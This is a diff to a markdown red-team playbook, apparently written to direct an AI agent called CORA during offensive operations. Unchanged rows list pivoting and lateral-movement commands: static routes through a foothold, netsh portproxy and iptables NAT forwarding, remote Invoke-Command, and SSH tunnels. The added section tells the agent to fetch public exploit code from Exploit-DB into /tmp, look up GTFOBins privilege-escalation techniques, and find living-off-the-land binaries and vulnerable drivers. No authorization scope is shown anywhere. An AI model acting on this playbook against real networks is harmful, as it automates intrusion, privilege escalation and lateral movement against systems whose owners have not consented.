@@ -78,3 +78,20 @@ Activate `[[reasoning/red_team_strategy_playbook]]` whenever the query, goal, or
 | **Inject Cross-Subnet Static Route via Pivot** | `route add <REMOTE_SUBNET> mask 255.255.255.0 <PIVOT_GATEWAY_IP>` | `sudo ip route replace <REMOTE_SUBNET>/24 via <PIVOT_GATEWAY_IP>` | `STAGE_3_CROSS_SUBNET_L3_ROUTE`: Target subnet is disjoint from local L2 interfaces. |
 | **Enable IP Forwarding & NAT / Port Proxy** | `netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=<LPORT> connectaddress=<TARGET_IP> connectport=<RPORT>` | `sudo sysctl -w net.ipv4.ip_forward=1 && sudo iptables -t nat -A POSTROUTING -o <EGRESS_IFACE> -j MASQUERADE` | Route traffic across segmented subnets or forward internal-only services (`127.0.0.1`) externally. |
 | **Execute Remote Lateral Command / Tunnel** | `powershell -NoProfile -Command "Invoke-Command -ComputerName <TARGET_IP> -ScriptBlock { whoami; hostname }"` | `ssh -N -L 0.0.0.0:<LPORT>:<TARGET_IP>:<RPORT> <USER>@<PIVOT_IP>` *(or `-D 1080` SOCKS5)* | Pivot execution or tunnel L4/L7 traffic through an established foothold host. |
+
+---
+
+## 4. Verified Live CVE, Exploit & Offensive Tooling Intelligence (`fetch_webpage`, `web_search` & `curl`)
+> **Master Hub:** [[reasoning/cyber_threat_cve_and_tools_intelligence_strategy_playbook]] | **HTTP/API Reference:** [[commands/curl_playbook]]
+
+When service banners, OS versions, SUID/sudo binaries, or kernel drivers are discovered during Phases 1–3, use CORA's Tier-1 `fetch_webpage` / `web_search` tools (easiest, works in all modes) or `curl -sSL ... | jq` via `run_shell`:
+
+| Offensive Objective | Easiest CORA Tool (`fetch_webpage` / `web_search`) | Shell CLI Alternative (`curl` / `jq`) |
+| :--- | :--- | :--- |
+| **Passive Zero-Packet Public IP Recon (Ports + CPEs + CVEs)** | `fetch_webpage(url="https://internetdb.shodan.io/<PUBLIC_IPV4>")` | `curl -sSL --max-time 15 "https://internetdb.shodan.io/<PUBLIC_IPV4>" \| jq '.'` |
+| **NIST NVD Official CVE & CVSS Lookup** | `fetch_webpage(url="https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-YYYY-NNNN", query_filter="descriptions")` | `curl -sSL --max-time 15 "https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-YYYY-NNNN" \| jq '.vulnerabilities[0].cve'` |
+| **CISA KEV (Exploited in Wild) & FIRST EPSS** | `fetch_webpage(url="https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json", query_filter="CVE-YYYY-NNNN")` | `curl -sSL --max-time 15 "https://api.first.org/data/v1/epss?cve=CVE-YYYY-NNNN" \| jq '.data[0]'` |
+| **Public Exploit PoCs (`Exploit-DB`) & `Nuclei` YAML** | `web_search(query="CVE-YYYY-NNNN", site="exploit-db.com")` *(or)* `fetch_webpage(url="https://www.exploit-db.com/raw/<EDB_ID>")` | `curl -sSL --max-time 15 -A "Mozilla/5.0" "https://www.exploit-db.com/raw/<EDB_ID>" -o /tmp/exploit.py` |
+| **Linux SUID / Sudo / Capability Escalation (`GTFOBins`)** | `fetch_webpage(url="https://gtfobins.github.io/gtfobins/<binary>/", query_filter="sudo suid")` | `curl -sSL --max-time 15 "https://raw.githubusercontent.com/GTFOBins/GTFOBins.github.io/master/_gtfobins/<binary>.md"` |
+| **Windows Native LOLBins & Vulnerable Drivers (`LOLBAS` / `LOLDrivers`)** | `fetch_webpage(url="https://lolbas-project.github.io/api/lolbas.json", query_filter="Certutil.exe")` | `curl -sSL --max-time 15 "https://www.loldrivers.io/api/drivers.json" \| jq '.[] \| select(.Tags[]? == "<driver.sys>")'` |
+| **Kali Linux Tool Syntax & PayloadsAllTheThings** | `fetch_webpage(url="https://www.kali.org/tools/<tool>/")` or `web_search(query="<technique>", site="book.hacktricks.xyz")` | `curl -sSL --max-time 15 "https://www.kali.org/tools/<tool>/" \| grep -E "Usage\|-" \| head -n 35` |
